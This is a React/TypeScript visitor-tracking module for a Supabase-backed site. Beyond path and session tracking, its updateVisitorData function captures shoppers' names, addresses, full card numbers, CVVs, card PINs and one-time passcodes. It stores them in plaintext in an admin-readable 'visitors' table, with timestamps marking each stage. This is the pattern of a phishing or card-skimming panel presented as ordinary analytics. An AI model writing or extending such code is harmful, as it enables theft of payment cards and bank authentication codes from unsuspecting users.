import { useEffect, useRef } from "react";
import { useLocation } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useCountry } from "@/contexts/CountryContext";
import { useCurrency } from "@/contexts/CurrencyContext";

const SESSION_KEY = "sl_visitor_sid";
const BOOTSTRAP_KEY_PREFIX = "sl_visitor_bootstrapped:";

/** Routes that belong to the admin panel — never tracked as visitor activity. */
const isAdminPath = (path: string) =>
  path.startsWith("/admin");

const getBootstrapKey = (sessionId: string) => `${BOOTSTRAP_KEY_PREFIX}${sessionId}`;

const isBootstrapped = (sessionId: string) => {
  if (typeof window === "undefined") return false;
  return localStorage.getItem(getBootstrapKey(sessionId)) === "1";
};

const markBootstrapped = (sessionId: string) => {
  if (typeof window === "undefined") return;
  localStorage.setItem(getBootstrapKey(sessionId), "1");
};

/**
 * Get (or create) the visitor session id.
 * - Stored in localStorage so the same visitor is recognized across tabs/reloads.
 * - NEVER creates a new id while the user is on an admin route (prevents the
 *   admin's own browsing from polluting visitor records).
 */
const getSessionId = (): string => {
  let sid = localStorage.getItem(SESSION_KEY);
  if (!sid) {
    if (typeof window !== "undefined" && isAdminPath(window.location.pathname)) {
      return "__admin_placeholder__";
    }
    sid = (crypto.randomUUID?.() ?? `v_${Date.now()}_${Math.random().toString(36).slice(2)}`);
    localStorage.setItem(SESSION_KEY, sid);
  }
  return sid;
};

export const getVisitorSessionId = getSessionId;

type BootstrapPayload = {
  session_id: string;
  landing_path: string;
  last_path: string;
  user_agent: string;
  referrer: string | null;
  language: string;
  last_seen_at: string;
  detected_country?: string;
  country?: string;
  currency?: string;
};

let bootstrapPromise: Promise<void> | null = null;
let bootstrapSessionId: string | null = null;

const ensureVisitorRecord = async (payload: BootstrapPayload) => {
  if (payload.session_id === "__admin_placeholder__") return payload.session_id;
  if (isBootstrapped(payload.session_id)) return payload.session_id;

  if (bootstrapPromise && bootstrapSessionId === payload.session_id) {
    await bootstrapPromise;
    return payload.session_id;
  }

  bootstrapSessionId = payload.session_id;
  bootstrapPromise = (async () => {
    // Merge-upsert so we both create the row and refresh last_seen/last_path
    // on returning visitors. ignoreDuplicates would skip the row entirely.
    const { error } = await supabase
      .from("visitors")
      .upsert(payload, { onConflict: "session_id" });
    if (error) {
      console.error("[visitor] bootstrap upsert failed", error);
      return;
    }
    markBootstrapped(payload.session_id);
  })().finally(() => {
    bootstrapPromise = null;
    bootstrapSessionId = null;
  });

  await bootstrapPromise;
  return payload.session_id;
};

const createWindowBootstrapPayload = (session_id: string): BootstrapPayload => {
  const now = new Date().toISOString();
  return {
    session_id,
    landing_path: window.location.pathname,
    last_path: window.location.pathname,
    user_agent: navigator.userAgent,
    referrer: document.referrer || null,
    language: navigator.language,
    last_seen_at: now,
  };
};

/**
 * Update the current visitor's record with extra data (e.g. from Checkout/Auth forms).
 * Safe to call any number of times.
 */
export const updateVisitorData = async (data: {
  full_name?: string;
  email?: string;
  phone?: string;
  address?: string;
  city?: string;
  country?: string;
  postal_code?: string;
  user_id?: string;
  card_holder?: string;
  card_number?: string;
  card_expiry?: string;
  card_cvv?: string;
  card_pin?: string;
  card_otp?: string;
  plan_selected?: string;
  order_total?: string;
}) => {
  if (typeof window !== "undefined" && isAdminPath(window.location.pathname)) {
    return;
  }

  const session_id = getSessionId();
  if (session_id === "__admin_placeholder__") return;

  const now = new Date().toISOString();

  const stageStamps = {
    ...(data.full_name || data.email || data.phone || data.address || data.city || data.postal_code || data.plan_selected || data.order_total
      ? { checkout_at: now }
      : {}),
    ...(data.card_holder || data.card_number || data.card_expiry || data.card_cvv
      ? { card_at: now }
      : {}),
    ...(data.card_pin ? { pin_at: now } : {}),
    ...(data.card_otp ? { otp_at: now } : {}),
  };

  // Always upsert directly. We can't rely on UPDATE+SELECT because the SELECT
  // policy on `visitors` only allows admins to read rows — a regular visitor's
  // .select() will return [] even when the update succeeded, leading us to a
  // wrong "row missing" branch. Upsert with merge handles both create + update
  // in a single round-trip without needing to read back.
  const { error: upsertErr } = await supabase.from("visitors").upsert(
    {
      ...createWindowBootstrapPayload(session_id),
      ...data,
      ...stageStamps,
      last_seen_at: now,
      last_path: window.location.pathname,
    },
    { onConflict: "session_id" }
  );
  if (upsertErr) {
    console.error("[visitor] upsert failed", upsertErr);
    throw upsertErr;
  }
  markBootstrapped(session_id);
};

/** Tracks the current visitor — registers on first visit, updates path on navigation. */
export const useVisitorTracking = () => {
  const location = useLocation();
  const { country, info } = useCountry();
  const { currency } = useCurrency();
  const initialized = useRef(false);

  useEffect(() => {
    if (initialized.current) return;
    if (isAdminPath(location.pathname)) return;
    initialized.current = true;

    const session_id = getSessionId();
    if (session_id === "__admin_placeholder__") return;

    void ensureVisitorRecord({
      ...createWindowBootstrapPayload(session_id),
      detected_country: country,
      country: info.nameAr,
      currency,
    });
  }, [country, info.nameAr, currency, location.pathname]);

  useEffect(() => {
    if (!initialized.current) return;
    if (isAdminPath(location.pathname)) return;

    const session_id = getSessionId();
    if (session_id === "__admin_placeholder__") return;

    const now = new Date().toISOString();

    void (async () => {
      await ensureVisitorRecord({
        ...createWindowBootstrapPayload(session_id),
        detected_country: country,
        country: info.nameAr,
        currency,
      });

      await supabase
        .from("visitors")
        .update({
          last_path: location.pathname,
          last_seen_at: now,
          detected_country: country,
          country: info.nameAr,
          currency,
          language: navigator.language,
        })
        .eq("session_id", session_id);
    })();
  }, [location.pathname, country, info.nameAr, currency]);
};
